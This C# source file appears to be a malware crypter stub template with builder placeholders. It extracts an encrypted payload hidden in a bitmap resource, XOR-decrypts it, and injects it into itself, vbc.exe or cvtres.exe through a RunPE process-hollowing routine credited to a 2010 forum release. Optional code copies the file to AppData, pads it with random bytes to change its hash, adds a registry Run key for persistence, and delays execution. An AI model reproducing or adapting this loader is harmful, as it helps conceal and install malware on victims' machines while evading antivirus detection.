//#define DELAY
//#define INSTALL

using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Library
{
    public class D
    {

        public D()
        {
           Run();
        }

        private static Random R = new Random();
#if INSTALL
        private static bool Install()
        {

            Thread.Sleep(3000);

            string startupName = "%STARTUPNAME%";
            string processName = "%PROCESSNAME%";

            string installFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), startupName);

            string installPath = Path.Combine(installFolder, processName);

            string currentPath = Application.ExecutablePath;

            if (installPath == currentPath)
            {
                //already installed
                return true;
            }

            if (File.Exists(installPath))
            {
                Environment.Exit(0);
                return true;
            }

            if (!Directory.Exists(installFolder))
            {
                Directory.CreateDirectory(installFolder).Refresh();
            }

            byte[] thisFile = File.ReadAllBytes(currentPath);

            //append something to change hash

            byte[] thisFile1 = new byte[thisFile.Length + 64];

            R.NextBytes(thisFile1); //fill new array with random shit;

            File.WriteAllBytes(installPath, thisFile1);

            Buffer.BlockCopy(thisFile, 0, thisFile1, 0, thisFile.Length); //copy back original file

            Thread.Sleep(1000);

            File.WriteAllBytes(installPath, thisFile1);

            RegistryKey runKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Microsoft").OpenSubKey("Windows").OpenSubKey("CurrentVersion").OpenSubKey("Run");

            runKey.SetValue(startupName, installPath);

            runKey.Close();

            Thread.Sleep(2000);

            Process.Start(installPath);

            Environment.Exit(0);

            return true;

        }
#endif

#if DELAY
        private static void Delay()
        {
            int seconds = int.Parse("%DELAY%");

            for (int i = 0; i < seconds; i++)
            {
                Thread t = new Thread(new ThreadStart(delegate () { Thread.Sleep(1000); }));
                t.Start();
                t.Join();
            }
            //Thread.Sleep(seconds * 1000);


        }
#endif

        public static void Run()
        {

#if DELAY
            Delay();
#endif

#if INSTALL
            Install();
#endif

            string injectionTarget = "%TARGET%";

            switch (injectionTarget)
            {
                default:
                case "itself":
                    injectionTarget = Application.ExecutablePath;
                    break;
                case "cvtres":
                case "vbc":
                    injectionTarget = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), string.Format("{0}.exe", injectionTarget));
                    break;
            }

            string rName = "%RESNAME%";
            string rId = "%RESID%";

            Bitmap bmp = (Bitmap)GetResource(rName, rId);

            byte[] data = ConvertFromBmp(bmp);

            byte[] k = Convert.FromBase64String("%KEY%");

            for(int i = 0; i < data.Length; i++)
            {
                data[i] = (byte)(data[i] ^ k[i % k.Length]);
            }

            //decrypt

            if(CMemoryExecute.Run(data, injectionTarget))
            {
                
            }
            else
            {
                Thread.Sleep(5000);
            }

            Environment.Exit(0);

        }

        private static object GetResource(string name, string key)
        {
            Assembly asm = Assembly.GetEntryAssembly();

            using (Stream s = asm.GetManifestResourceStream(name))
            {
                using (ResourceReader rr = new ResourceReader(s))
                {
                    IDictionaryEnumerator en = rr.GetEnumerator();

                    while (en.MoveNext())
                    {
                        if (en.Key is string && (string)en.Key == key)
                        {
                            return en.Value;
                        }
                    }
                   
                }
            }
            throw new Exception();
        }

        private static byte[] ConvertFromBmp(Bitmap b)
        {
            int l = b.Width;

            int n = l * l * 4;

            byte[] buff = new byte[n];

            int k = 0;

            for (int x = 0; x < l; x++)
            {
                for (int y = 0; y < l; y++)
                {

                    Buffer.BlockCopy(BitConverter.GetBytes(b.GetPixel(x, y).ToArgb()), 0, buff, k, 4);

                    k += 4;
                }
            }

            int len = BitConverter.ToInt32(buff, 0);

            byte[] f = new byte[len];

            Buffer.BlockCopy(buff, 4, f, 0, f.Length);

            return f;


        }

        #region RunPe
        /* 
         * Title: CMemoryExecute.cs
         * Description: Runs an EXE in memory using native WinAPI. Very optimized and tiny.
         * 
         * Developed by: affixiate 
         * Release date: December 10, 2010
         * Released on: http://opensc.ws
         * Credits:
         *          MSDN (http://msdn.microsoft.com)
         *          NtInternals (http://undocumented.ntinternals.net)
         *          Pinvoke (http://pinvoke.net)
         *          
         * Comments: If you use this code, I require you to give me credits. Don't be a ripper! ;]
         */

        // ReSharper disable InconsistentNaming
        internal static unsafe class CMemoryExecute
        {
            /// <summary>
            /// Runs an EXE (which is loaded in a byte array) in memory.
            /// </summary>
            /// <param name="exeBuffer">The EXE buffer.</param>
            /// <param name="hostProcess">Full path of the host process to run the buffer in.</param>
            /// <returns></returns>
            public static bool Run(byte[] exeBuffer, string hostProcess)
            {

                string optionalArguments = "";
                byte[] IMAGE_SECTION_HEADER = new byte[0x28]; // pish
                byte[] IMAGE_NT_HEADERS = new byte[0xf8]; // pinh
                byte[] IMAGE_DOS_HEADER = new byte[0x40]; // pidh
                int[] PROCESS_INFO = new int[0x4]; // pi
                byte[] CONTEXT = new byte[0x2cc]; // ctx

                byte* pish;
                fixed (byte* p = &IMAGE_SECTION_HEADER[0])
                    pish = p;

                byte* pinh;
                fixed (byte* p = &IMAGE_NT_HEADERS[0])
                    pinh = p;

                byte* pidh;
                fixed (byte* p = &IMAGE_DOS_HEADER[0])
                    pidh = p;

                byte* ctx;
                fixed (byte* p = &CONTEXT[0])
                    ctx = p;

                // Set the flag.
                *(uint*)(ctx + 0x0 /* ContextFlags */) = CONTEXT_FULL;

                // Get the DOS header of the EXE.
                Buffer.BlockCopy(exeBuffer, 0, IMAGE_DOS_HEADER, 0, IMAGE_DOS_HEADER.Length);

                /* Sanity check:  See if we have MZ header. */
                if (*(ushort*)(pidh + 0x0 /* e_magic */) != IMAGE_DOS_SIGNATURE)
                    return false;

                int e_lfanew = *(int*)(pidh + 0x3c);

                // Get the NT header of the EXE.
                Buffer.BlockCopy(exeBuffer, e_lfanew, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length);

                /* Sanity check: See if we have PE00 header. */
                if (*(uint*)(pinh + 0x0 /* Signature */) != IMAGE_NT_SIGNATURE)
                    return false;

                // Run with parameters if necessary.
                if (!string.IsNullOrEmpty(optionalArguments))
                    hostProcess += " " + optionalArguments;

                if (!CreateProcess(null, hostProcess, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, new byte[0x64], PROCESS_INFO))
                    return false;

                IntPtr ImageBase = new IntPtr(*(int*)(pinh + 0x34));
                NtUnmapViewOfSection((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase);
                if (VirtualAllocEx((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase, *(uint*)(pinh + 0x50 /* SizeOfImage */), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == IntPtr.Zero)
                    Run(exeBuffer, hostProcess); // Memory allocation failed; try again (this can happen in low memory situations)

                fixed (byte* p = &exeBuffer[0])
                    NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, ImageBase, (IntPtr)p, *(uint*)(pinh + 84 /* SizeOfHeaders */), IntPtr.Zero);

                for (ushort i = 0; i < *(ushort*)(pinh + 0x6 /* NumberOfSections */); i++)
                {
                    Buffer.BlockCopy(exeBuffer, e_lfanew + IMAGE_NT_HEADERS.Length + (IMAGE_SECTION_HEADER.Length * i), IMAGE_SECTION_HEADER, 0, IMAGE_SECTION_HEADER.Length);
                    fixed (byte* p = &exeBuffer[*(uint*)(pish + 0x14 /* PointerToRawData */)])
                        NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, (IntPtr)((int)ImageBase + *(uint*)(pish + 0xc /* VirtualAddress */)), (IntPtr)p, *(uint*)(pish + 0x10 /* SizeOfRawData */), IntPtr.Zero);
                }

                NtGetContextThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, (IntPtr)ctx);

                IntPtr address = Marshal.AllocHGlobal(4);

                Marshal.Copy(BitConverter.GetBytes(ImageBase.ToInt32()), 0, address, 4);

                NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0] /* pi.hProcess */, (IntPtr)((*((uint*)(ctx + (164)))) + 8), (IntPtr)(address), 0x4, IntPtr.Zero);

                *(uint*)(ctx + 0xB0/* eax */) = (uint)ImageBase + *(uint*)(pinh + 0x28 /* AddressOfEntryPoint */);
                NtSetContextThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, (IntPtr)ctx);

                //MessageBox.Show(err.ToString("X"));

                NtResumeThread((IntPtr)PROCESS_INFO[1] /* pi.hThread */, IntPtr.Zero);


                return true;
            }

            #region WinNT Definitions

            private const uint CONTEXT_FULL = 0x10007;
            private const int CREATE_SUSPENDED = 0x4;
            private const int MEM_COMMIT = 0x1000;
            private const int MEM_RESERVE = 0x2000;
            private const int PAGE_EXECUTE_READWRITE = 0x40;
            private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D; // MZ
            private const uint IMAGE_NT_SIGNATURE = 0x00004550; // PE00

            #region WinAPI
            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, int[] lpProcessInfo);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("ntdll.dll", SetLastError = true)]
            private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

            [DllImport("ntdll.dll", SetLastError = true)]
            private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);

            [DllImport("ntdll.dll", SetLastError = true)]
            private static extern int NtGetContextThread(IntPtr hThread, IntPtr lpContext);

            [DllImport("ntdll.dll", SetLastError = true)]
            private static extern int NtSetContextThread(IntPtr hThread, IntPtr lpContext);

            [DllImport("ntdll.dll", SetLastError = true)]
            private static extern uint NtResumeThread(IntPtr hThread, IntPtr SuspendCount);
            #endregion

            #endregion
        }
        #endregion
    }
}
